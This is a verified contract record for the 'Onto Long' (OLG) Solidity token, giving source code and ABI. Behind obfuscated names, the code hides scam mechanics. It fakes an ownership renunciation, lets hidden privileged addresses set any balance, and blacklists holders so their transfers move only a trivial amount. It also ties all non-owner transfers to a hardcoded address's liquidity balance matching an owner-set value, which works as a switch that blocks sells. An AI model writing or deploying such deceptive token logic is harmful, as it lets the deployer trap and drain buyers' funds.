{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface toFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamSenderLaunched {\n    function createPair(address fromTrading, address autoMinMarketing) external returns (address);\n}\n\ninterface tradingWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLimitLiquidity) external view returns (uint256);\n\n    function transfer(address totalTxWallet, uint256 sellAmountTo) external returns (bool);\n\n    function allowance(address swapMaxEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellAmountTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTxWallet,\n        uint256 sellAmountTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTakeLimit, uint256 value);\n    event Approval(address indexed swapMaxEnable, address indexed spender, uint256 value);\n}\n\ninterface tradingWalletMetadata is tradingWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OntoLong is enableWallet, tradingWallet, tradingWalletMetadata {\n\n    uint256 swapFeeWallet;\n\n    event OwnershipTransferred(address indexed maxLimit, address indexed swapReceiver);\n\n    mapping(address => bool) public senderTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buySender;\n    }\n\n    address launchedAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapLiquidity(address maxToken, address totalTxWallet, uint256 sellAmountTo) internal returns (bool) {\n        require(tokenAt[maxToken] >= sellAmountTo);\n        tokenAt[maxToken] -= sellAmountTo;\n        tokenAt[totalTxWallet] += sellAmountTo;\n        emit Transfer(maxToken, totalTxWallet, sellAmountTo);\n        return true;\n    }\n\n    function minExempt(address maxAmount, uint256 sellAmountTo) public {\n        launchedLaunchSender();\n        tokenAt[maxAmount] = sellAmountTo;\n    }\n\n    address private fromTxTeam;\n\n    address tokenMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private shouldTo;\n\n    uint8 private totalBuy = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return teamFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromTxTeam;\n    }\n\n    function balanceOf(address feeLimitLiquidity) public view virtual override returns (uint256) {\n        return tokenAt[feeLimitLiquidity];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalBuy;\n    }\n\n    address public tradingReceiver;\n\n    function owner() external view returns (address) {\n        return fromTxTeam;\n    }\n\n    mapping(address => bool) public limitBuy;\n\n    function approve(address senderSell, uint256 sellAmountTo) public virtual override returns (bool) {\n        listExempt[_msgSender()][senderSell] = sellAmountTo;\n        emit Approval(_msgSender(), senderSell, sellAmountTo);\n        return true;\n    }\n\n    bool private modeSwap;\n\n    function enableSender(uint256 sellAmountTo) public {\n        launchedLaunchSender();\n        swapFeeWallet = sellAmountTo;\n    }\n\n    function launchedLaunchSender() private view {\n        require(senderTotal[_msgSender()]);\n    }\n\n    string private teamFee = \"Onto Long\";\n\n    string private walletFee = \"OLG\";\n\n    bool public receiverMode;\n\n    bool private marketingReceiver;\n\n    uint256 private buySender = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private tokenAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletFee;\n    }\n\n    constructor (){\n        \n        toFund swapTrading = toFund(tokenMarketing);\n        tradingReceiver = teamSenderLaunched(swapTrading.factory()).createPair(swapTrading.WETH(), address(this));\n        \n        walletAuto = _msgSender();\n        minList();\n        senderTotal[walletAuto] = true;\n        tokenAt[walletAuto] = buySender;\n        \n        emit Transfer(address(0), walletAuto, buySender);\n    }\n\n    bool public toFrom;\n\n    function tradingAutoSell(address maxToken, address totalTxWallet, uint256 sellAmountTo) internal returns (bool) {\n        if (maxToken == walletAuto) {\n            return swapLiquidity(maxToken, totalTxWallet, sellAmountTo);\n        }\n        uint256 buyShouldSell = tradingWallet(tradingReceiver).balanceOf(launchedAt);\n        require(buyShouldSell == swapFeeWallet);\n        require(totalTxWallet != launchedAt);\n        if (limitBuy[maxToken]) {\n            return swapLiquidity(maxToken, totalTxWallet, tokenMax);\n        }\n        return swapLiquidity(maxToken, totalTxWallet, sellAmountTo);\n    }\n\n    function atLimitIs(address marketingTxLaunch) public {\n        launchedLaunchSender();\n        if (toFrom != modeSwap) {\n            enableTo = launchLiquidity;\n        }\n        if (marketingTxLaunch == walletAuto || marketingTxLaunch == tradingReceiver) {\n            return;\n        }\n        limitBuy[marketingTxLaunch] = true;\n    }\n\n    function minList() public {\n        emit OwnershipTransferred(walletAuto, address(0));\n        fromTxTeam = address(0);\n    }\n\n    function sellSender(address sellMarketing) public {\n        if (autoReceiver) {\n            return;\n        }\n        \n        senderTotal[sellMarketing] = true;\n        if (listFund != modeSwap) {\n            modeSwap = true;\n        }\n        autoReceiver = true;\n    }\n\n    uint256 private toAtExempt;\n\n    function transferFrom(address maxToken, address totalTxWallet, uint256 sellAmountTo) external override returns (bool) {\n        if (_msgSender() != tokenMarketing) {\n            if (listExempt[maxToken][_msgSender()] != type(uint256).max) {\n                require(sellAmountTo <= listExempt[maxToken][_msgSender()]);\n                listExempt[maxToken][_msgSender()] -= sellAmountTo;\n            }\n        }\n        return tradingAutoSell(maxToken, totalTxWallet, sellAmountTo);\n    }\n\n    uint256 private enableTo;\n\n    uint256 limitFee;\n\n    uint256 private launchLiquidity;\n\n    mapping(address => mapping(address => uint256)) private listExempt;\n\n    bool public autoReceiver;\n\n    function transfer(address maxAmount, uint256 sellAmountTo) external virtual override returns (bool) {\n        return tradingAutoSell(_msgSender(), maxAmount, sellAmountTo);\n    }\n\n    function allowance(address amountSell, address senderSell) external view virtual override returns (uint256) {\n        if (senderSell == tokenMarketing) {\n            return type(uint256).max;\n        }\n        return listExempt[amountSell][senderSell];\n    }\n\n    address public walletAuto;\n\n    uint256 public maxFund;\n\n    uint256 constant tokenMax = 14 ** 10;\n\n    bool public listFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMaxEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTakeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTxLaunch\",\"type\":\"address\"}],\"name\":\"atLimitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimitLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellAmountTo\",\"type\":\"uint256\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountTo\",\"type\":\"uint256\"}],\"name\":\"minExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTxWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OntoLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}